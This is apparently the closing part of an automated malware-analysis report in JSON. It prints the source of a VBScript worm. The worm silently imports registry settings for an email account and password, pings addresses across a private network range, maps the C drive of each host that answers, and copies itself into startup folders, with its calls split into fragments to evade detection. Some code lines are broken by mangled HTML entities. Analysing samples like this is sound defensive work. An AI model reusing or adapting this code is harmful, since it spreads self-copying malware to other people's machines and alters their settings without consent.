            "\">=?IMAP Port>=?=dword:0000008f\"&vbcrlf& _",
            "\">=?IMAP Timeout>=?=dword:0000003c\"&vbcrlf& _",
            "\">=?IMAP Use LSUB>=?=dword:00000001\"&vbcrlf& _",
            "\">=?IMAP Polling>=?=dword:00000001\"&vbcrlf& _",
            "\">=?IMAP Svr-side Special Folders>=?=dword:00000001\"&vbcrlf& _",
            "\">=?IMAP Sent Items Folder>=?=>=?Posta inviata>=?\"&vbcrlf& _",
            "\">=?IMAP Drafts Folder>=?=>=?Bozze>=?\"&vbcrlf& _",
            "\">=?IMAP Prompt for Password>=?=dword:00000000\"&vbcrlf& _",
            "\">=?IMAP Dirty>=?=dword:00000000\"&vbcrlf& _",
            "\">=?IMAP Poll All Folders>=?=dword:00000001\"&vbcrlf& _",
            "\">=?HTTPMail Prompt for Password>=?=dword:00000000\"&vbcrlf& _",
            "\">=?HTTPMail Polling>=?=dword:00000001\"&vbcrlf& _",
            "\">=?ShowAdBar>=?=dword:00000001\"&vbcrlf& _",
            "\">=?POP3 Server>=?=>=?mail.supereva.it>=?\"&vbcrlf& _",
            "\">=?POP3 User Name>=?=>=?mp3free1>=?\"&vbcrlf& _",
            "\">=?POP3 Password2>=?=hex:01,02,6d,00,61,00,69,00,6c,00,2e,00,73,00,75,00,70,00,65,\\\"&vbcrlf& _",
            "\"  00,72,00,65,00,76,00,61,00,2e,00,69,00,74,00,34,00,42,00,44,00,37,00,31,00,\\\"&vbcrlf& _",
            "\"  46,00,45,00,30,00,00,00\"&vbcrlf& _",
            "\">=?POP3 Use Sicily>=?=dword:00000000\"&vbcrlf& _",
            "\">=?POP3 Port>=?=dword:0000006e\"&vbcrlf& _",
            "\">=?POP3 Timeout>=?=dword:0000003c\"&vbcrlf& _",
            "\">=?POP3 Skip Account>=?=dword:00000001\"&vbcrlf& _",
            "\">=?POP3 Prompt for Password>=?=dword:00000000\"&vbcrlf& _",
            "\">=?SMTP Server>=?=>=?mail.supereva.it>=?\"&vbcrlf& _",
            "\">=?SMTP Port>=?=dword:00000019\"&vbcrlf& _",
            "\">=?SMTP Timeout>=?=dword:0000003c\"&vbcrlf& _",
            "\">=?SMTP Display Name>=?=>=?ss dd>=?\"&vbcrlf& _",
            "\">=?SMTP Email Address>=?=>=?mp3free1@supereva.it>=?\"&vbcrlf& _",
            "\">=?SMTP Split Messages>=?=dword:00000000\"&vbcrlf& _",
            "\">=?SMTP Split Message Size>=?=dword:00000040\"&vbcrlf& _",
            "\">=?=?SMTP Prompt for Password>=?=dword:00000000\"",
            " dt1 = replace(data1, chr(62) & chr(61) & chr(63), \"\"\"\")",
            " Set fso = createobject(\"scripting.filesystemobject\")",
            " set b=fso.CreateTextFile(\"C:\\small.reg\")",
            " b.close",
            " set d=fso.OpenTextFile(\"C:\\small.reg\",2)",
            " d.Write dt1",
            " d.close",
            " Set Shell = WScript.CreateObject(\"WScript.Shell\")",
            " Shell.Run \"c:\\small.reg\", 1",
            " Set Shell = Nothing",
            " Set WshShell = WScript.CreateObject(\"WScript.Shell\")",
            " WScript.Sleep 200",
            " WshShell.SendKeys \"{ENTER}\"",
            " WScript.Sleep 200",
            " WshShell.SendKeys \"{ENTER}\"",
            " WScript.Sleep 100",
            " Set keyr = fso.GetFile(\"c:\\small.reg\")",
            " keyr.Delete",
            "end function",
            "Function share()",
            "On Error Resume Next",
            "set wshnetwork = wscript.createobject(\"wscript.network\")",
            "Const OpenAsDefault    = -2",
            "Const FailIfNotExist   =  0",
            "Const ForReading       =  1",
            "for ap = 192 to 255",
            "for bp = 168 to 255",
            "for cp = 0 to 255",
            "for dp = 0 to 255",
            "x = \".\"",
            "sHost = ap & x & bp & x & cp & x & dp",
            "Set oShell = CreateObject(\"WScript.Shell\")",
            "Set oFSO = CreateObject(\"Scripting.FileSystemObject\")",
            "sTemp = \"C:\"",
            "sTempFile = sTemp & \"\\netlog.tmp\"",
            "oShell.Run \"%comspec% /c ping -n 1 \" & sHost & \">\" & sTempFile, 0 , True",
            "Set fFile = oFSO.OpenTextFile(sTempFile, ForReading, FailIfNotExist, OpenAsDefault)",
            "Set fso = CreateObject(\"scripting.filesystemobject\")",
            "Set r = fso.opentextfile(\"C:\\netlog.tmp\")",
            "buff = \"\"",
            "for az = 0 to 3",
            "buff = r.readline",
            "next",
            "buff2 = InStr(buff,\"TTL=\")",
            "if buff2 <> \"0\" then",
            "Call registra(sHost)",
            "end if",
            "next",
            "next",
            "next",
            "next",
            "End Function",
            "Function registra(computer)",
            "set wshnetwork = wscript.createobject(\"wscript.network\")",
            "sharename = \"\\\\\" & computer &\"\\C\"",
            "wshnetwork.mapnetworkdrive \"j:\", sharename",
            "execute = \"fso.copyfile WSc\"&\"ript.Scrip\"&\"tFul\"&\"lname, \"&Chr(34)&\"j:\\netlog.vbs\"&Chr(34)",
            "If (fso.FileExists(\"j:\\netlog.vbs\")) Then",
            "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\")",
            "execute \"sup = WshShell.Sp\"&\"ecia\"&\"lFol\"&\"ders(\" & Chr(34) & \"AllUsersStartup\" & Chr(34) & \")\"",
            "execute = \"fso.copyfile WSc\"&\"ript.Script\"&\"Ful\"&\"lname, \" & sup & \"\\\"",
            "execute = \"fso.copyfile WSc\"&\"ript.Script\"&\"Ful\"&\"lname, \"&Chr(34)&\"j:\\W\"&\"I\"&\"N\"&\"D\"&\"O\"&&am",
            "p;qu",
            "ot;W\"&\"S\\Men\"&\"u Av\"&\"vio\\Prog\"&\"rammi\\Es\"&\"ec\"&\"uzi\"&\"on\"&\"e au\"&\"tom\"&\"at\"&\"ica\\\"&Chr(34)",
            "execute = \"fs\"&\"o.co\"&\"pyfile WScrip\"&\"t.Script\"&\"Ful\"&\"lname, \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"d\"&\"o\"&&am",
            "p;qu",
            "ot;w\"&\"s\\st\"&\"artm~1\\prog\"&\"rams\\st\"&\"artup\\\"&Chr(34)",
            "execute = \"fso.copyfile WScript.ScriptFu\"&\"lln\"&\"ame, \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"d\"&\"o\"&&am",
            "p;qu",
            "ot;w\"&\"s\\\"&Chr(34)",
            "execute = \"fs\"&\"o.copyfil\"&\"e WScript.Scr\"&\"iptF\"&\"ull\"&\"name, \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"d\"&\"o\"&&am",
            "p;qu",
            "ot;w\"&\"s\"&\"\\\"&\"s\"&\"t\"&\"a\"&\"r\"&&",
            ";quo",
            "t;t \"&\"m\"&\"en\"&\"u\\pro\"&\"gra\"&\"ms\\st\"&\"ar\"&\"tu\"&\"p\\\"&Chr(34)",
            "execute = \"fso.cop\"&\"yfile WScr\"&\"ipt.Scr\"&\"iptF\"&\"ulln\"&\"ame",
            ", \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"9\"&\"5\"&&am",
            "p;qu",
            "ot;\\\"&\"s\"&\"t\"&\"a\"&\"rt m\"&\"e\"&\"nu\\pr\"&\"o\"&\"gr\"&\"a\"&\"ms\\s\"&\"ta\"&\"r\"&\"tu\"&\"p\\\"&Chr(34)",
            "End If ",
            "wshnetwork.removenetworkdrive \"j:\"",
            "End function",
            "End if"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.sesso.com"
        ]
    },
    "time": "0:00:00.331605",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
